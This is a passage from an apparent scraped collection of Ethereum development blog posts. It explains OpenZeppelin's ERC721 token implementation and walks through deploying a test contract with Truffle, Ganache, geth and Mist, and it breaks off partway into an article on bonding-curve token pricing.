to your address. Since each token value is unique, we can no longer simply look at a balance of tokens\u200a\u2014\u200awe have to look at each individual token created by the contract. The main contract keeps a running list of all the ERC721 tokens created in that contract in an array, so each token has its\u2019 respective index within the context of all ERC721 tokens available from that particularity contract via the allTokens array.uint256[] internal allTokensHowever, we also need to know which tokens we own, not just what the contract holds. So, in addition to the array of token indexes in the entire contract, each individual address has an array of token indexes or ids that is mapped to their address as ownership. We do not simply map an address to a token index because what if an individual owns more than one token? If we were only mapping individual indexes, say we owned token number 5 and that was mapped to our address. However, tomorrow, we buy token 6, then if we had only mapped individual values number 5 would be overwritten by number 6 in our mapping, and we would no longer have a recorded that we owned token 5 as well\u200a\u2014\u200ahence the need for an array.mapping (address => uint256[]) internal ownedTokensThis simple difference spurs many of the additional requirements of an ERC721 token. With an ERC20 token, we were checking against a balance, but now, we need to check ownership against a specific index of a token. To rearrange this array when we transfer tokens necessitates further requirements.So do we iterate through our array of tokens each time we want to verify ownership of a certain token index? No, there is a much simpler and safer way. Rather, in addition to our array of token indexes that we own, we map each token index or id to an owner. In this way, every time we would like to know who owns a certain token index, we need only provide the token index to check the address to which it is mapped. (This variable is included in the ERC721BasicToken.sol, which is inherited into ERC721Token.sol.)mapping (uint256 => address) internal tokenOwnerWhy do we do this in addition to the array? Can\u2019t we just iterate through our array of tokens to ensure we own a specific token? Let\u2019s first ask this question: If we transfer tokens, can\u2019t we just add or delete tokens indexes to our array? Unfortunately, no. Recall that in Solidity, should we decide to delete an element in an array, the element is not actually, fully deleted but replaced with a zero. For example, let\u2019s say that we have an array myarray = [2 5 47], which is of length 3. However, then we call a function that says to delete myarray[myarray.length.sub(1)]. Although we may expect that myarray = [2 5], we actually have the following array myarray = [2 5 0], and it would still be of length 3. We do not magically own the token of id 0, so this presents a problem. Recall that delete does not actually \u201cdelete\u201d values in Ethereum but rather resets them to zero. Certainly, there are cases in which we would like to delete or remove a token from the ownership of an address. Rather than simply delete tokens from our array, we rather rearrange our array. We will see later on when we look at transferring (removing ownership) and burning tokens how this information comes into play. For this reason, we also keep track of the below. The ownedTokensIndex maps each token id to its respective index in its owner\u2019s array. As stated below, we also map the token id to its index in the allTokens array as well.// Mapping from token ID to index of the owner tokens list mapping(uint256 => uint256) internal ownedTokensIndex; //Mapping from token id to position in the allTokens array mapping(uint256 => uint256) internal allTokensIndex;Another issue we may come across is if we want to check how many ERC721 tokens that we actually own. At this point, we introduce one more variable to keep track of ownership. (Again, this variable is in ERC721BasicToken.sol and inherited into ERC721Token.sol.)mapping (address => uint256) internal ownedTokensCountNow, we map a number to keep track of how many tokens that we do own to our address. This ownedTokensCount is updated as we purchase, transfer or potentially burn tokens accordingly. Why do we need to keep track of how many ERC721 tokens we own? Verification. Let\u2019s say we want to transfer all of our ERC721 tokens to a new address? Or just check that we own a certain amount?At this point, we can see how introducing the ownership of a unique token adds new complexity to the ownership of a token. But what about the creation of these ERC721 tokens?Token CreationRecall that in the case of ERC20 tokens, we are mapping against a balance of tokens. Hence in order to create ERC20 tokens, we need only to set or increase the total tokens available. In the ERC20 design, we have a value that maintains our total available token supply, totalSupply_ below. In some cases, you may have seen a ERC20 token contract set the total supply through a value initialized in the constructor. Recall that a constructor function is run once to initialize a contract (but it is not required). The constructor must carry the exact same name as the contract\u200a\u2014\u200aif it does not carry the same name as the contract, the EVM will register your intended constructor as a normal function and that means any one can call it after contract creation, which can present numerous security vulnerabilities depending on what you are doing. The constructor code is part of the transaction that creates the contract, but it is not part of the contract at the deployed location. The constructor may be used to set initial values, ownership, etc. In the below, MyToken is used to set the value of the totalSupply_ of tokens. With increased demand to allow for variability of the amount of ERC20 tokens within a contract, the ERC20 standard was expanded to also include a mint function in which a desired amount of tokens is added to the totalSupply_ and balances are mapped accordingly. Note that in the below Transfer is an event, not a function\u200a\u2014\u200aam I the only one who has spent time trying to look for a function that turn out to be an event while reading Solidity? Anyways, again you can see from the mint function where our balance is updated.uint256 totalSupply_- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - //Example of setting token supply via constructorcontract MyToken {    function MyToken(uint _setSupply)          { totalSupply_ = _setSupply_ }.....//Example of maintaining a variable token supply via mintingfunction mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) { totalSupply_ = totalSupply_.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); Transfer(address(0), _to, _amount); return true; }As to ERC721\u2019s, we have learned that since each individual token is unique, we must create each individual token. With ERC20, we can easy create a batch of 100 more by adding to the totalSupply_. However, since we maintain an array of tokens in an ERC721 standard, we need to add each token to that array separately.Here we see two functions that look to a ERC721 contract\u2019s total supply addTokenTo() and _mint(). Let\u2019s go over addTokenTo() first.Here we call addTokenTo() from our full implementation contract, and then, the super.addTokenTo() allows us to first call the addTokenTo() function in our basic ERC721 contract. Essentially, over the the course of these two functions, we update all global ownership variables. The functions take in two parameters _to or the address to which the token will be owned and _tokenId or the unique id of the token\u200a\u2014\u200achosen by whomever you allow to call this function, you\u2019d likely limit this call to the owner of the contract. In this case, the user can choose any unique number id. First, in the ERC721BasicToken contract, we check that the token id is not already owned. Then we set the token owner of the requested token id, and add one to the number of owned tokens of that individual account. Going back to the full implementation contract, we also update the array of the new owner\u2019s (_to)tokens by adding this new token to the end of their ownedTokens array and saving the index of that new token.From the above, we can see that addTokenTo() updates an address to an individual. However, what about the allTokens array? This is where _mint fills in the gap. Here we see when we call _mint() from our full implementation ERC721 contract that again we jump up to our basic implementation, which ensures that we are not minting to an address of zero and calls addTokenTo(), which as confusing as it is, will actually call back to our full implementation contract to kick off the addTokenTo() calls. (Again, Transfer() is an event, not a function.) After the _mint() function in the basic contract is completed, back in our full implementation, we add the _tokenId to our allTokensIndex\u2019s mapping as well as our allTokens array.From the above, you can see that although you can call addTokenTo() by itself, what you need to do to maintain all information in a full implementation ERC721 contract is use _mint() to create your new tokens.But what about the metadata that ERC721\u2019s can supposedly hold? We have created tokens and token ids, but they are not holding any data yet. Open Zeppelin gives us an example of how this could look with a mapping a token id to a string to of URI data.// Optional mapping for token URIs mapping(uint256 => string) internal tokenURIs;In order to set a token\u2019s URI data, the following _setTokenURI() function is also included. Here using the token Id that you created via _mint() and your desired URI information, you can set the data that is mapped to a token ID in tokenURIs. Note the requirement in this function that we determine that a token Id exists (meaning someone owns it) prior to assigning data.Although more complex and gas intensive, I find the ability to use a struct to store data instead of a mapping to an index far more interesting\u200a\u2014\u200aat the least, creating a non-fungible token with a handful of variables is still far less expensive than creating a smart contract per each \u201casset\u201d instead. In any case, if you are wondering how to include different data, these elements are what you would want to look at changing.Transfer & AllowanceAs before, let\u2019s first review how transfers and allowance happens in the ERC20 standard. We can transfer an ERC20 token directly using the transfer() function in which we specify an address that we want to send to and how much, which is checked against our balances and then updated in the main ERC20 contract.function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0));   require(_value <= balances[msg.sender]);   balances[msg.sender] = balances[msg.sender].sub(_value);    balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value);  return true; }But, what do we mean by allowance? When we want another contract or address to be able to transfer our ERC20 tokens, we need to allow the use the ERC20 contract address to do that for us\u200a\u2014\u200athis need arises in many instances in distributed applications\u200a\u2014\u200aescrows, games, auctions, etc. Hence, we need a way to approve other address to spend our tokens. Then, another transfer function requires the contract to check the allowance of who is allowed to spend them. I\u2019ll start with how allowance is set up, and then show how that plays into transfers.In the ERC20 standard, we have a global variable allowed in which an owners address is mapped to an approved spender\u2019s address and then mapped an amount of tokens. In order to set this variable, there is an approve() function in which an individual is able to map an approval to their desired _spender and _value. Notice that here, we are not checking that actual amount of tokens owned by the sender\u200a\u2014\u200athat comes later at transfer. Once more, Approval is an event not a function.//Global variablemapping (address => mapping (address => uint256)) internal allowed//Allowance of another address to spend your tokensfunction approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; }Now, once we have approved another address to transfer our tokens, how are our tokens actually transferred? Our approved spender would use the transferFrom() function below in which they would specify the _from or original owner\u2019s address, the receiver\u2019s address _to and the amount _value. Here we check that the original owner actually possesses the amount desired to be transferred with require(_value \u2264 balances[_from])\u00a0, then we check that the msg.sender is allowed to transfer the balance through the allowed variable and ultimately we update all of our mapped balances as well as our allowed amounts. Again, Tranfer is an event. Note, there are two additional functions included to allow for increasing (increaseApproval()) and decreasing (decreaseApproval()) an approved spender\u2019s allowance as well.So, once more, we need to think that instead of approval and transfer of balances, in the case of ERC721\u2019s, we need to approve and transfer token ids. The ERC721 standard offers the chance approve an address for token transfer by id or we can approve an address to transfer all owned tokens. To approve transfer by id, we use the approve() function as below. Here a global variable, tokenApprovals, maps a token index or id to an address that is approved to transfer it. In the approve() function, we first check for ownership or if the msg.sender isApprovedForAll()\u00a0. Further below, you can see that you can use the setApprovalForAll() function to approve one address to transfer and handle all of the tokens that are owned by a particular address as we have a global variable operatorApprovals in which the owner\u2019s address is mapped to a approved spender\u2019s address and then mapped to a bool. This is set to 0 or false by default, but by using setApprovalForAll() we can set this mapping to true and allow an address to handle all of the ERC721\u2019s are owned. Note, if a spender is approved for all tokens, then they can also assign additional address spend capabilities. Next, we use getApproved() to check that we are not setting approval for address(0)\u00a0. At last, our tokenApprovals mapping is completed to the desired address. And like ERC20, Approval is event.Now, we arrive to how we actually transfer ERC721\u2019s. The full implementation actually offers a two ways in which to transfer. The first method is discouraged, but let\u2019s go over it to understand. In transferFrom(), the sender and receiver addresses are specified along with the _tokenId to transfer, and we use a modifier, canTransfer() to ensure that the msg.sender is approved to transfer the token or owns it. After checking the sender and receiver addresses are valid, the clearApproval() function is used to remove the approval of the transfer from the original owner of the token, so that a previously approved spender may not continue to transfer the token. Next, the removeTokenFrom() is called in the ERC721 full implementation contract, and similar to the addTokenTo() function using super to call the removeTokenFrom() function in the ERC721 basic implementation. You can see that the token is removed from the ownedTokensCount mapping, the tokenOwner mapping, and one more twist is that we move the last token in the owner\u2019s ownedTokens array to the index of the token that is being transferred and shorten the array by one (see lines 22\u201330). Lastly, we use the addTokenTo() function to add this token index to its new owner. And Transfer is an event.Now, a question to ask, how do we ensure that we are sending our ERC721 to a contract that can handle additional transfers? We know an externally owned account (EOA) can use our ERC721 full implementation contract to trade tokens if desired; however, if we send our token to a contract that is does not have the appropriate functions to trade and transfer the token via our original ERC721 contract, then the token will be effectively lost as there is no way to get it out. This sentiment reflects much of the concern that was brought to light through the ERC223 proposal, which is a proposed modification to ERC20 to prevent these erroneous transfers.In order to avoid issues and standardize, the ERC721 full implementation standard introduces the safeTransferFrom() function. Prior to diving into how that works, let\u2019s look at some additional requirements in which we have an ERC721Holder.sol contract that implements the ERC721Receiver.sol interface. The ERC721Holder.sol contract is to be part of the wallet, auction or broker contract in which you would want to hold an ERC721 token. The reason this has been standardized goes back to EIP165 in which the goal is to create \u201ca standard method to publish and detect what interfaces a smart contract implements.\u201d How do we detect an interface? Below we will see a \u201cmagic value,\u201d ERC721_RECEIVED, which is the function signature of the onERC721Received() function\u00a0. A function signature is the first four bytes of the hash of the canonical signature string. In this case it is computed by bytes4(keccak256(\u201conERC721Received(address, uint256, bytes)\u201d)) as described below. What is the function signature used for? To find the place in the bytecode that contains the code for the called function called. Each function in your contract will have it\u2019s own signature, and when you make a call to your contract the EVM uses a series of switch cases to find the function signature that matches your call and executes your code accordingly. Consequently, in our ERCHolder contract we see that the onERCReceived() function signature will match the ERC721_RECEIVED variable in our ERC721Receiver interface.Your ERC721Holder contract is not a complete contract for handling ERC721 tokens. This template is meant to provide you with a standardized interface to verify that the ERC721Receiver standard interface is used. You will need to extend or inherit the ERC721Holder contract to include functions in your wallet or auction contract to handle ERC721\u2019s. Even to hold tokens in escrow you would need to add functionality so that this holder contract could make a call to transfer tokens out of the contract as needed.Now, back to our original ERC721 contract, the safeTransferFrom() works in the following way\u200a\u2014\u200ayou can either transfer using Option 1 in which there is no additional data included with the safeTransferFrom() function or you can use Option 2 to include data in the form of bytes _data. As before the transferFrom() function is used to remove token ownership from the _from address and add token ownership to the _to address. However, we have an additional requirement that we run the checkAndCallSafeTransfer() function. First, we check that the_to address is an actual contract through the use of the AddressUtils.sol library\u200a\u2014\u200aI included the function isContract() in the below so that you can quickly see what it is doing. As noted, there is currently research and development into allowing external owned accounts (EOAs) on Ethereum maintain their own code as well, so whenever that point comes, it would need to be noted for a check like this. After verifying that _to is a contract address, we check that calling the onERC721Received() function returns the same function signature that we are expecting from our standard interface. If the correct value is not returned, then the transferFrom() function is rolled back as we have determined that the _to does not implement the expected interface.Whew, there we have it. Transferring ERC721 tokens. Now, burning tokens should look easy.BurningAs to ERC20, since we are only manipulating a single mapped balance, we only need to burn or destroy tokens against a specific address, which can be a user or a contract. In the below burn()\u00a0, we specify the number of tokens that we would like to burn via the _value variable. The address against which to burn is the msg.sender, so we update their respective balances, and then we reduce the totalSupply_ of tokens as well. Here Burn and Transfer are events.For ERC721 tokens, we need to ensure that the specific token id or index is eliminated. Much like the addTokenTo() and _mint() function, our _burn() function uses super to call a function in our basic ERC721 implementation. First, we clearApproval(), then remove the token from ownership via removeTokenFrom() and use the Transfer event to alert this change on the front end. Next, we eliminate the metadata associated with that token by deleting what is mapped to that particular token index. Lastly, much like removing a token from ownership, we rearrange our allTokens array so that we replace the _tokenId index with the last token in the array.If you made it to the end, thanks for reading! I imagine the biggest challenges will be adapting these standards around how to mint ERC721\u2019s with the desired metadata and how to ensure transfer based on unique exchanges of values. At present, there are already a lot of examples\u200a\u2014\u200aof course, the famous Cryptokitties, Cryptogs (from my team at EthDenver), Cryptocelebrities, Decentraland and if you visit OpenSea you can find a whole lot of digital assets and collectibles. I can imagine significantly more use cases for this standard\u200a\u2014\u200ahope this write up helps to get you there\u2026!", "responses": "29"}, {"title": "Ethereum Development Walkthrough (Part 2: Truffle, Ganache, Geth and\u00a0Mist)", "author_name": "dev_zl", "link": "https://hackernoon.com/ethereum-development-walkthrough-part-2-truffle-ganache-geth-and-mist-8d6320e12269?source=search_post", "post_date": "Jan 15, 2018", "readtime": "11 min read", "upvotes": "1.95K", "content": "Ethereum Development Walkthrough (Part 2: Truffle, Ganache, Geth and\u00a0Mist)dev_zlBlockedUnblockFollowFollowingJan 15, 2018We have seen in the first part of this tutorial series what a smart contract is, and how it works. Now, we will deploy it to two kinds of test networks.The tools we will\u00a0useThe most prominent tools at the moments are:Truffle: A development environment, testing framework and asset pipeline for Ethereum. In other words, it helps you develop smart contracts, publish them, and test them, among other things. You can read the docs of the Truffle suite for more informations.Ganache: It was called TestRPC before, if you have read a tutorial from a few months ago, chances are they use TestRPC with Truffle, but it was renamed upon the integration of TestRPC within the Truffle Suite. What Ganache does is simple, it creates a virtual Ethereum blockchain, and it generates some fake accounts that we will use during development.Mist: It\u2019s a browser for decentralized web apps. It seeks to be the equivalent of Chrome or Firefox, but for Dapps. It\u2019s still insecure and you shouldn\u2019t use it with untrusted dapps as of yet.Ethereum wallet: It\u2019s a version of Mist, but only opens one single dapp, the Ethereum Wallet. Mist and Ethereum Wallet are just UI fronts. And we need a core that will connect us to an Ethereum blockchain(It could be the real Ethereum blockchain, or a test one).Geth: Is the core application on your computer that will connect you to a blockchain. It can also start a new one (in our case we will create a local test blockchain), create contract, mine ether etc.We will start by using Truffle and Ganache, and then use Truffle with geth and Mist.InstallationsThe requirements for this tutorial are that you know what is and how to use a command-line tool, and you are a bit familiar with NPM.TruffleOpen up a command-line, and type the next part:npm install -g truffleIf something goes wrong I advise you to read more on Truffle\u2019s docs.GanacheThen, install Ganache\u2019s command-line interface:npm install -g ganache-cliIf you are unsure about something, here is Ganache\u2019s Github page.N.B: There is a GUI for Ganache, but because we are such haxors, we will use the CLI.Let\u2019s startFirst, create a new folder, and type the next line:truffle initIt will initialize an empty truffle project.Then copy the Wrestling.sol file from the last tutorial, into the folder \u201ccontracts\u201d.Next, open the folder \u201cmigrations\u201d and create a new file named \u201c2_deploy_contracts.js\u201d. Migrations are simply scripts that\u2019ll help us deploy our contracts to a blockchain.Paste the following code inside, and save.The first line is there to import the \u201cWrestling.sol\u201d file from the \u201ccontracts\u201d folder, and the 4th line deploys it to the blockchain.Now, back to the root folder, you\u2019ll see two files, \u201ctruffle.js\u201d and \u201ctruffle-config.js\u201d. If you are on Windows, remove \u201ctruffle.js\u201d, if you are on another system, remove one of them, or keep them both, it\u2019s not important. The reason for that is, on Windows there is a naming problem, and when we will want to execute Truffle commands, it will open the config file \u201ctruffle.js\u201d instead of reading what\u2019s inside.I\u2019m writing this tutorial on Windows, so I\u2019ll remove the \u201ctruffle.js\u201d file. Then I\u2019ll put this code inside of \u201ctruffle-config.js\u201d:It basically says, that, when using the development network, connect to the host at \u201c127.0.0.1\u201d (localhost), using the port 7545.Now we are ready to test our code on a blockchain!Testing our\u00a0codeIn the first part, we will use Ganache.Fire a new command-line and type in the following command:ganache-cli -p 7545What it does is, it tells ganache-cli to start at the port 7545.Ganache will generate test accounts for us, they have 100 ether by default, and are unlocked so we can send ether from them freely. The first account for example is the guy right here:Now, back to our first command-line interface, we execute two commands:truffle compiletruffle migrate --network developmentCompile will compile our Solidity code to bytecode (the code that the Ethereum Virtual Machine (EVM) understands), in our case, Ganache emulates the EVM.Migrate will deploy the code to the blockchain, in our case, the blockchain could be found in the network \u201cdevelopment\u201d we set earlier in the \u201ctruffle-config.js\u201d file.Now, if everything has gone as expected, you should see this on your terminal:Notice that it shows the address of the instantiated Wrestling contract.On the commande-line interface where ganache-cli is run, you can see the transactions being executed:Notice that it shows the address of the instantiated Wrestling contract.Now type the following command to start Truffle\u2019s console. It will help us interact with ganache\u2019s blockchain.truffle console --network developmentFirst, we will execute this commands:account0 = web3.eth.accounts[0]account1 = web3.eth.accounts[1]It will assign the address of the first account to the variable account0, the second to the variable account1. Web3 is a JavaScript API that wraps RPC calls to help us interact with a blockchain in an easy way.Then we will write this:Wrestling.deployed().then(inst => { WrestlingInstance = inst })It assigns a reference to the instance of the contract that truffle deployed to the variable \u201cWrestlingInstance\u201d.Execute the the next line:WrestlingInstance.wrestler1.call()It will return the address of the wrestler1, in our case it was the first account. Truffle, during the migration, picked up the default account from Ganache, which is the first account, because we didn\u2019t specify another account address during the migration, or another address in the configuration file of Truffle.We will then register the second account as an opponent:WrestlingInstance.registerAsAnOpponent({from: account1})Here, the \u201cfrom\u201d directive tells the function from which account the transaction should be fired.Upon executing the line, it should return something similar to this:Notice that the transaction used Gas, and it fired the event \u201cWrestlingStartsEvent\u201d.You could retrieve the address of the second wrestler by executing the following line:WrestlingInstance.wrestler2.call()Now, the players can wrestle:WrestlingInstance.wrestle({from: account0, value: web3.toWei(2, \"ether\")})WrestlingInstance.wrestle({from: account1, value: web3.toWei(3, \"ether\")})// End of the first roundWrestlingInstance.wrestle({from: account0, value: web3.toWei(5, \"ether\")})WrestlingInstance.wrestle({from: account1, value: web3.toWei(20, \"ether\")})// End of the wrestlingThe \u201cvalue\u201d directive is used to send ether with a transaction. The \u201cweb3.toWei(5, \u201cether\u201d)\u201d part sends 5 ether, that value is converted to Wei. Wei is the base unit (lowest denomination) of ether. More infos could be found at this link.Upon executing the last line, the account1 will be the winner, since we put 23 ether in total with it, and it\u2019s more than the double of what we put with the account0.A little exercise for you is to withdraw the ether from the contract.Now, it\u2019s up to you to research how to use Truffle\u2019s and Ganache\u2019s advanced features. You can start by reading the docs, and alternatively, here is an excellent introduction to Truffle if you felt lost or want to reinforce your knowledge on what we just saw.How geth will fit in the\u00a0pictureNow, if we used Ganache for development, we would want to use something closer to a real environment, if only just to be more familiar with it.InstallationsStart by downloading geth. On Windows, you might need to add geth\u2019s installation folder to your PATH variable.Download Mist or Ethereum Wallet. For our use, both will be alike, so it doesn\u2019t matter which one you pick.Onto the creation of the local private test\u00a0networkIn the same root folder, create a new file, and name it \u201cgenesis.json\u201d. Then past the following content in it.The file \u201cgenesis.json\u201d is simply the configuration file that geth needs to create a new blockchain. It\u2019s not important to understand the content of the file for the moment.If you run geth without specifying any parameter, it will try to connect to the mainnet. The mainnet is the main network of Ethereum, the real blockchain of Ethereum.If you run Mist without specifiying any parameter, it will throw an error if an instance of geth is running. If you tell Mist to connect to the geth instance that is actually running(what we will do in a little moment) it\u2019ll work just fine. If you run Mist while no instance of geth is running, it will start a new instance of geth, and eventually ask you from which blockchain network it should download blocks.There is a public Ethereum test network, but we will create our own private test network locally, using the \u201cgenesis.json\u201d file we created earlier.Fire up another command-line interface and type in the following (be sure to run it in your project root folder):geth --datadir=./chaindata/ init ./genesis.jsonWe launch geth and specify where our blockchain will be stored, here in the \u201cchaindata\u201d folder (it will be automatically generated), and we initialize it with our \u201cgenesis.json\u201d configuration file.We then start geth using the following command:geth --datadir=./chaindata/ --rpcThe \u201c--rpc\u201d parameter tells geth to accept RPC connections, it\u2019s needed so that truffle can connect to geth.Open another command-line interface, and start Mist (or Ethereum Wallet), using the same parameters:mist \u2013rpc http://127.0.0.1:8545The \u201c-rpc\u201d tells Mist (or Ethereum Wallet) to connect to the instance of geth we started.In the Wallets tab, press Add Account and create a new wallet:Notice that we are using a private network. Beware of that, you wouldn\u2019t want to use you ether on the Mainnet for development purposes.I will create an account using the password \u201c123456789\u201d. In a real environment, use a stronger password.Open up a new command-line interface and run this command:geth attachIt will run the console of geth, and we can now interact with it.With out main account created on the Mist UI, we will run this command inside of \u201cgeth attach\u201d console:miner.start()It will start a miner, the process that will confirm transactions, and after a few seconds or minutes (depending or your computer), you should start seeing ether being added to your balance (And also to your main account):Note that if you don\u2019t have enough RAM available, it may not start mining at all. You can stop the mining using the command \u201cminer.stop()\u201d.Now, open the \u201ctruffle-config.js\u201d file again, and modify it like this:The \u201courTestNet\u201d is the configuration necessary to connect to the geth instance. Geth starts by default on port 8545.In the command-line interface where we launched \u201cgeth attach\u201d, we will unlock the account, so we can use it to migrate the Smart Contract from Truffle, using the following command:personal.unlockAccount('0x6AC4660c960Aaf5d9E86403DDAcB4791767e5869', '123456789')Here, I used the address of the account I just created, it would be a different address for you, and the password \u201c123456789\u201d that I\u2019ll use for these tests. Notice that the password is shown in plain text, and you should use a different method with a real account.Now, back to the command-line interface where we previously launched Truffle, run this command:truffle migrate --network ourTestNetIt will start migrating the contract to the blockchain that geth is running. Start the miner if you previously stopped it, otherwise, the migration will not be executed.If the migration was successful, you would see an output like this:Now, run the following command to start Truffle\u2019s console:truffle console --network ourTestNetThen run these two commands:Wrestling.addressJSON.stringify(Wrestling.abi)You should have an output like this:The first line returns the address of the deployed Wresting contract instance.The second line, will return the Wresting contract ABI. The ABI is basically a description of the contract. It contains a list of its functions and variables among other things.When copying the address and the ABI, remove the apostrophes highlighted by a red arrow in the screenshot.Now, back to Mist, we will open the contracts tab, and click on watch contract.Then we will past the address and the ABI of the Wrestling contract we deployed:Click on \u201cOK\u201d, then it will be shown in your watched contracts list. Click on it and it will open the contract page. If you scroll down, you\u2019ll see something like this:Use the select a function part to interact with the contract. It\u2019s the same as we did above using Truffle\u2019s console.And that\u2019s it, we saw how Ganache and geth come in play. When you will want to deploy a contract to the real blockchain, you should use the second method and connect geth with the mainnet.N.B: You could deploy a contract directly on Mist without using Truffle migration system, here is an example video of that process. Using Truffle is more interesting in a real development process though, since you\u2019ll be able to include and import multiple other smart contracts and scripts if you use a modular approach to develop your smart contracts.N.B.2: You could always write your contract code on a basic nodepad application, and deploy it to the mainnet using some trusted third party\u2019s portal, but I advise you to not.The repository for this tutorial can be found here:devzl/ethereum-walkthrough-2ethereum-walkthrough-2 - Repository for the second part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comIn conclusionWe have seen 4 ways of developing and deploying our Smart Contracts:The first one is to use Truffle and Ganache. Since we copied the code from the last tutorial, I want to tell you that there are plugins available for the most popular text editors and IDEs. Some offer only syntax highlighting, while others help with other areas.The second one is to deploy code from Truffle to geth (and the GUI app Mist).The third, is to use Remix to write small, simple contract when you are just learning Solidity, and deploying the code in Mist like shown in the video previously linked.Or like a real cowboy, you could use a simple text editor to write and then deploy your untested contract using a nameless third party\u2019s drag-and-drop deployment feature.In the next part, we will discuss security since our \u201cWrestling\u201d script is far from being ready to be launched in a real environment.After, that we will see Token creation, and Initial Coin Offerings (ICOs).If you liked this second part, you can find me on twitter @dev_zl.", "responses": "39"}, {"title": "What we learned building our first Ethereum\u00a0Dapp", "author_name": "Brendan Lee", "link": "https://medium.com/coinmonks/what-we-learned-building-our-first-dapp-28b01f9fc244?source=search_post", "post_date": "Jun 7, 2018", "readtime": "13 min read", "upvotes": "1.3K", "content": "What we learned building our first Ethereum\u00a0DappBrendan LeeBlockedUnblockFollowFollowingJun 7, 2018Update: if you enjoyed this article\u200a\u2014\u200acheck out what we\u2019re building at Nodesmith. We\u2019re making it easier for developers to build blockchain based applications, by providing them with all the core infrastructure to make polished & scalable applications.IntroductionA couple of months ago, myself and my colleague Samm decided it was past time we learned Ethereum and Solidity development. After passively following Ethereum since its launch, we decided to build an Ethereum Dapp as a side project to help us better understand the underlying technology.We had a few goals in mind for the Dapp we wanted to build:The Dapp had to be small in scope, but cover all the meaningful features of Ethereum and Solidity.The Dapp had to run without us needing to manage any cloud services ourselves\u200a\u2014\u200ameaning we would only write client code and Ethereum smart contracts.We would open source whatever code we wrote and share what we learned.What we ended up building was a small game called Eth Plot! Eth Plot was inspired by Reddit\u2019s famous r/place April Fool\u2019s joke and by the million dollar homepage. It allows you to buy \u201cplots\u201d of digital space on a grid. In the plot you purchase, you can place an image and a link to a website of your choosing. You can also resell your plots at any given time.App screenshots showing a user purchasing a new\u00a0plotFeel free to check out the Dapp here! It is running on the mainnet as well as Ropsten, Rinkeby and Kovan. We hope some folks use the application, but our primary goal with this project was our own education. We learned a lot, and in this article, we will share with you what we learned during this endeavor.Warning: this is a bit of a long read! Want to skip directly to the code? Here\u2019s the main smart contract, and here is the React/Redux application that forms the UI. We hope the sample code will be helpful to those embarking on the journey of building their first Dapp.Our intended audience for this article is developers who are familiar with Ethereum, but perhaps haven\u2019t written their first Dapp yet and would like an overview of what it entails, accompanied by some tips and tricks we picked up along the way. We do not claim to be experts, and aren\u2019t aiming to write another in-depth tutorial on Dapp development. Here\u2019s what we will be covering in this article:A high level overview of our tech stack\u200a\u2014\u200aall the technologies we used to build Eth Plot.The details of the Eth Plot smart contract\u200a\u2014\u200aimplementing the functionality needed for this app in an efficient way was surprisingly complicated.Tips and tricks\u200a\u2014\u200aa catch-all collection of helpful tidbits we learned while developing Eth Plot.", "responses": "11"}, {"title": "Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured Assets", "author_name": "Matthew Campbell", "link": "https://medium.com/loom-network/loom-network-plasma-5e86caaadef2?source=search_post", "post_date": "Apr 12, 2018", "readtime": "5 min read", "upvotes": "3.2K", "content": "Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured AssetsMatthew CampbellBlockedUnblockFollowFollowingApr 12, 2018Update:We released our Plasma Cash implementation in June 2018. Check out the release announcement here.Articles in this\u00a0series:Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured Assets \ud83d\udc48Practical Plasma (Volume I): GamingPlasma Cash Initial Release\u200a\u2014\u200aPlasma-Backed NFTs Now Available on Loom Network Sidechains", "responses": "4"}, {"title": "How to Make Bonding Curves for Continuous Token\u00a0Models", "author_name": "Slava Balasanov", "link": "https://blog.relevant.community/how-to-make-bonding-curves-for-continuous-token-models-3784653f8b17?source=search_post", "post_date": "Feb 6, 2018", "readtime": "9 min read", "upvotes": "1.6K", "content": "How to Make Bonding Curves for Continuous Token\u00a0ModelsSlava BalasanovBlockedUnblockFollowFollowingFeb 6, 2018This is a technical primer on how to make your own bonding curves, followed by a discussion about the opportunities and risks involved. If you\u2019re not interested in the tech, skip to the end for some general insights. If you just want some code samples in solidity, the reference github repo is here:relevant-community/contractscontracts - Relevant Bonding Curve and Token Contractsgithub.comWhat are Bonding\u00a0Curves?There has recently been a lot of renewed excitement about ideas behind curation markets, a term coined by Simon de la Rouviere:The core, functional components of curation markets involve:A token that can be minted at any time (continuous) according to a price set by the smart contract.This price gets more expensive as more tokens are in circulation.The amount paid for the token is kept in a communal deposit.At any point in time, a token can be withdrawn (\u201cburned\u201d) from the active supply, and a proportional part of the communal deposit can be taken with.The tokens are used to bond it to curators per sub-topic, who then curate information with their proportional backing.tweet via Fred EhrsamIn curation markets, tokens are bought and sold according to a \u201cbonding curve\u201d\u200a\u2014\u200aan equation that defines the token price as a function of token supply.Here is an example of a quadratic bonding curve:currentPrice = tokenSupply\u00b2When a user wants to buy 10 tokens, the contract mints 10 new tokens, computes their price and sends those tokens to the user in exchange for Ether (or another reserve token).But computing how much we should charge for the 10 new tokens isn\u2019t trivial. One might think it should be 10 * currentPrice, but that\u2019s not correct because creating each new token increases the price, so the user must pay a little more than the currentPrice for each subsequent token.A naive approach might be to iterate over the new tokens and update the price at each iteration. However this is very inefficient and also inaccurate, because even the smallest change in token supply (like\u00a0.1 tokens) will move the price.What we want to do is compute the sum of all the infinitely small changes in price. This is the same as computing the area under the bonding curve\u200a\u2014\u200awe can easily do this using integrals.For example, to compute the total Ether (poolBalance) held by our quadratic bonding curve contract we compute the integral of the price function:poolBalance = 1/3 * tokenSupply\u00b3This is the same as the area under our curve between 0 and tokenSupply:From this we can derive how much we should charge for 10 new tokens:priceForTokens = 1/3* (tokenSupply + 10)\u00b3\u200a\u2014\u200apoolBalanceUsing this method we can compute formulas for bonding curves based on any power function y=x^p. The sample code includes cases for y=m * x\u00b2, y=m * x and y = m * sqrt(x)Bancor FormulaHowever we can do better. Remember Bancor? The ICO that raised $153M last summer with 40 lines of code? Well, that code is for computing a general type of bonding curve.A nice property of power functions is that we can define our bonding curve in terms of a reserve ratio. Reserve ratio is defined by the relationship between token price, token supply and poolBalance.reserveRatio = poolBalance 